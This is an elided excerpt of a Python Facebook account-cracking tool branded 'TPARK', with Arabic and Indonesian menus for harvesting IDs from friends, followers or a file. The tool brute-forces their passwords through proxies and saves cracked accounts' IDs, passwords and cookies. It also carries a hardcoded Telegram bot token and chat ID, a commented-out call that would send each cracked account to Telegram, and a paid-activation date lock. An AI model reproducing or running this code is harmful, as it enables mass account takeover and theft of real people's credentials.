...
print('\033[1;32m')
print('\033[1;33m By: @tf_r7 ` @t_r67')
print('\033[1;32m')
print('\033[1;35m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
...
import datetime;now = datetime.date.today();target = datetime.date(2023, 9, 30)
if now >=target:exit("Contact the developer for activation 💰 ( @tf_r7 ) ")
else:print("Welcome")
...
output = render('TPARK',colors=['green','white'], align='center')
print(output)
print(GG+'-'*1+W+'{ '*1+GG+'@tf_r7'*1+W+' }'*1+GG+'-'*1+W+'{'*1+Z1+' • 𝕋ℙ𝔸ℝ𝕂 ֆ ۦٰ ۦٰ׀𝐁𝐘𓅓'*1+W+' }'*1+F'-'*1+GG+W+'{'*1+GG+'@t_r67'*1+W+'}'*1)
print('')
token=('5892525344:AAGer5nA5rengxKmIY9F9nnjmsEZr89dfFc')
print('')
ID=('5133630165')
os.system('clear')
...
try:
	...
	open('Tpark 🍓 - Prox.txt').write(prox)
...
class Login:
    ...
    def hapus(self):
        try:os.remove("Tpark 🍓 - Coki.txt");os.remove("Tpark 🍓 - Id.txt")
        except:pass
    ...
    def login_cokie(self):
        ...
        try:
            ...
            if 'href="/zero/optin/write/' in str(link):
                ...
                open('Tpark 🍓 - Coki.txt', 'w').write(cok);open('Tpark 🍓 - Id.txt', 'w').write(f"{nama}|{user}")
    ...
    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (X11; Linux x86 64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"})
    ...
    def menu(self):
        try:
            cook = {"cookie": open("Tpark 🍓 - Coki.txt", "r").read()}
            nama, user = open("Tpark 🍓 - Id.txt", "r").read().split("|")
        ...
        def clear():
        	...
        	def back():
        		llogin()
        	def banner():
        		print(f'''• 𝕋ℙ𝔸ℝ𝕂 َ،'ֆ ۦٰ׀𝐁𝐘𓅓''')
        exit()
        


        ykh = input(f"{H}[{M}♪{H}]{N} • 𝕋ℙ𝔸ℝ𝕂 َ،'ֆ ۦٰ׀𝐁𝐘𓅓 ")
        if ykh in ["", " "]:
...
def llogin():
	try:
		token = open('Tpark 🍓 - Token.txt','r').read()
		cok = open('Tpark 🍓 - Cok.txt','r').read()
	...
	try:
		...
		with requests.Session() as r:
			try:
				...
				r.headers.update({'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (X11; Linux x86 64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application//shtml+xm,application/ml;q=0.9,image/avifimage/webpimage/apng,""q=0.8,','sec-fetch-dest': 'document',})
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							tokenew = open("Tpark 🍓 - Token.txt","w").write(access_token)
							cook= open("Tpark 🍓 - Cok.txt","w").write(your_cookies)
							print('')
							print(f"{x}[{h}√{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ");time.sleep(1);exit()
			except Exception as e:
				
				os.system('rm -rf Tpark 🍓 - Token.txt && rm -rf Tpark 🍓 - Cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
...
def menu(my_name,my_id):
	...
	print(Z+'\x1b[2;36mTELE ⋘ @tf_r7 ⋙  ')
	print('')
	print(f'➺  Your ID : '+str(my_id))
	print(f'➺  Your IP : {ip}')
	print('')
	print('➺ 1- Fishing from friends : مـن الـاصـدقـاء  ')
	print('➺ 2- Fishing from followers : مـن الـمـتـابـعـيـن ')
	print('➺ 3- Crack File : مـن مـلـف  ')		
	print('➺ 0- login out : تـسـجـيل خـروج   ')
...
def follower():
	try:
		...
		exit()
	try:
		jum = int(input('[♥️] CRACK ID LIMIT : اكـتـب عـدد الـايـديـات '))
	except ValueError:
		print('{k}[☹️] NOT PUBLIC ID ')
		time.sleep(3)
		follower()
	if jum<1:
		print('[☹️] Your limit error')
		time.sleep(3)
		follower()
	ses=requests.Session()
	yz = 0
...
def dump_massal():
	...
	try:
		print('')
		jum = int(input('➺ Number ID | عـدد الـايـديـات : '))
		print('')
	except ValueError:
	...
	try:
		print('')
		print(f'➺ ID | عـدد الـايـديـات {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Loh Kurang Bagus ')
...
#		method.append('touch')
		...
		method.append('mobile')
	print('')
	_jembot_ = input('>> Add App : اظهار التطبيقات المرتبطه ( Y ) ')
	print('')
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('>> Password Manual : ( Y ) باسورد يدوي (T عشوائي) ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s • 𝕋ℙ𝔸ℝ𝕂 َֆ ۦٰ׀𝐁𝐘𓅓 %s/%s 🔥𝗩𝗜𝗣 ⌠𝗢𝗞𖤍⌡ %s 🔥𝗩𝗜𝗣 ⌠𝗖𝗣𖤍⌡ %s 𖤤 %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
⊊𝗕𝗬⊋ ➩ @t_r67 - @tf_r7			
					...
					open('Tpark 🐥 - CP 🔴/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				...
				if 'no' in taplikasi:
					...
					open('Tpark 🍭 - OK 🟢/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'''			
𖣘────━𓆩𝕋ℙ𝔸ℝ𝕂 َ،'ֆ𓆪━────𖣘
...
𖣘──────────────────𖣘
 ⊊𝗕𝗬⊋ ➩ @t_r67 -  @tf_r7'''
   ...
   \n{infoakun}					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='Tpark 🍭 - OK 🟢'))
					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break
...
def O():
	try:
		os.remove('Tpark 🍓 - Id.txt')
		os.remove('Tpark 🍓 - Coki.txt')
		os.remove('Tpark 🍓 - Token.txt')
		os.remove('.Tpark 🍓 - Cok.txt')
...
if __name__=='__main__':
	...
	try:os.mkdir('Tpark 🍭 - OK 🟢')
	except:pass
	try:os.mkdir('Tpark 🐥 - CP 🔴')
	except:pass
	try:os.mkdir('/sdcard/Tpark 🍼. - Ilove')
	except:pass
	try:os.system('Tpark 🍓 - Prox.txt')
	except:pass
